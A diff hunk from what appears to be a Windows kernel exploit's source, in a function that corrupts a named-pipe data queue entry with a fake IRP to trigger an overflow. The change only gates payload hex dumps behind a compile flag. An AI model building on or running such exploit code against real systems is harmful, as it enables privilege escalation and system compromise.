@@ -349,11 +349,13 @@ bool MemoryBroker::CorruptPipe()
     entry->dataQueue.Irp = fakeIRP;
     entry->dataQueue.EntryType = 0x1;
 
-	HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());
 	printf(" [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x%llx within leaked chunk\n", (unsigned long long)(layout.targetPipeOffset - CHUNKSIZE + 0x10));
-	HexDumpLittleEndian(entry, sizeof(NP_DATA_QUEUE_ENTRY));
 	printf(" [*] Full payload to trigger overflow:\n");
+#if PRINT_PAYLOAD_HEXDUMPS
+	HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());
+	HexDumpLittleEndian(entry, sizeof(NP_DATA_QUEUE_ENTRY));
     HexDumpLittleEndian(payload.data(), (size_t)payload.size());
+#endif
 
 
     return true;
